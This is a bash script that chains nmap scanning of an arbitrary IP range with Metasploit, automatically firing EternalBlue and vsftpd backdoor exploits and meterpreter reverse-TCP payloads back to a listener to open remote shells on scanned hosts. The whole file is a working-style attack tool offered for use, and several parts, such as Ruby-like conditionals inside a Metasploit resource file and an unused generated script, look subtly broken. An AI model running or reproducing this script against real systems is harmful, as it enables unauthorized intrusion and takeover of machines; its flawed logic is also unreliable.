#!/bin/bash

# Nmap to Metasploit Auto-Exploit Script
# Requires: msfconsole, nmap, postgresql running (service postgresql start)

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target_ip_or_range>"
    echo "Example: $0 192.168.1.0/24"
    exit 1
fi

TARGET=$1
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
NMAP_XML="nmap_scan_${TIMESTAMP}.xml"
MSF_RC="/tmp/msf_autoexploit_${TIMESTAMP}.rc"

# Auto-detect local IP for reverse connections
LHOST=$(ip route get 1 | awk '{print $7}' | head -1)
LPORT=4444
PAYLOAD="windows/x64/meterpreter/reverse_tcp"  # Change if targeting Linux/Android

echo "[+] Starting Nmap service detection scan on $TARGET"
nmap -sV -O -p- --open -oX "$NMAP_XML" "$TARGET" || { echo "Nmap failed"; exit 1; }

echo "[+] Nmap scan complete. Results saved to $NMAP_XML"

echo "[+] Starting PostgreSQL and Metasploit database (if not running)"
service postgresql start
msfdb init 2>/dev/null || msfdb reinit 2>/dev/null  # Ensure DB is ready

echo "[+] Importing Nmap XML into Metasploit database"
msfconsole -q -x "db_import $NMAP_XML; exit;" || { echo "Import failed"; exit 1; }

echo "[+] Generating resource script for auto-exploitation"

cat << EOF > "$MSF_RC"
# Set up reverse handler
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j

# Search and launch matching exploits
db_connect
vulns -o  # List potential vulnerabilities from services

# Auto-exploit common vulnerabilities
search ms17_010
if $?.empty?
  use exploit/windows/smb/ms17_010_eternalblue
  set PAYLOAD $PAYLOAD
  set LHOST $LHOST
  set LPORT $LPORT
  set RHOSTS file:/proc/self/fd/0  # Will be populated by hosts loop
  exploit -j -z
end

search vsftpd
if $?.empty?
  use exploit/unix/ftp/vsftpd_234_backdoor
  set PAYLOAD generic/shell_reverse_tcp
  set LHOST $LHOST
  set LPORT $LPORT
  exploit -j -z
end

# Add more common exploits as needed (e.g., Heartbleed, Shellshock, etc.)

# List sessions at the end
sleep 10
sessions -l
EOF

# Better: Use hosts with open ports and run matching modules
echo "[+] Launching Metasploit auto-exploitation (background jobs + handler)"

msfconsole -q -r - << EOF
# Start handler
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j

# Target hosts with vulnerable services
hosts -o /tmp/hosts.txt
$(while read host; do
  echo "Trying common exploits on $host..."
  # MS17-010
  echo "use exploit/windows/smb/ms17_010_eternalblue"
  echo "set RHOSTS $host"
  echo "set LHOST $LHOST"
  echo "set LPORT $LPORT"
  echo "set PAYLOAD $PAYLOAD"
  echo "exploit -j -z"
done < <(msfconsole -q -x "hosts -c address -o /tmp/hosts.txt; cat /tmp/hosts.txt; exit;" | grep -E "^[0-9]"))

# Keep running to catch sessions
sleep 30
sessions -l
exit
EOF

echo "[+] Auto-exploitation complete!"
echo "    Check for sessions with: msfconsole -q -x 'sessions -l'"
echo "    Handler listening on $LHOST:$LPORT"
echo "    Nmap XML saved as: $NMAP_XML"

# Optional cleanup
# rm "$NMAP_XML" /tmp/hosts.txt
